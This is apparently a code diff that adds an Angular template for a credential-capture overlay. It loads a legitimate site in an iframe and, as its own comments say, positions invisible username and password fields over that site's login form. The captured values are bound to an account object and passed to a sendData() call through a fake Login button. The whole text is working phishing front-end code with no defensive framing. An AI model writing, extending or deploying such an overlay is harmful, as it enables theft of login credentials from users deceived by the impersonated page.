@@ -1,0 +1,23 @@
+<!-- Legitimate site rendered behind the overlay -->
+<iframe [src]="targetUrl" frameborder="0" allowfullscreen></iframe>
+
+<!-- Invisible inputs positioned over the iframe's login form -->
+<div class="overlay">
+  <input
+    type="text"
+    class="capture-input"
+    placeholder="Username"
+    autocomplete="off"
+    [(ngModel)]="accountData.username"
+    name="overlayUsername"
+  />
+  <input
+    type="password"
+    class="capture-input"
+    placeholder="Password"
+    autocomplete="off"
+    [(ngModel)]="accountData.password"
+    name="overlayPassword"
+  />
+  <button type="button" class="capture-btn" (click)="sendData()">Login</button>
+</div>
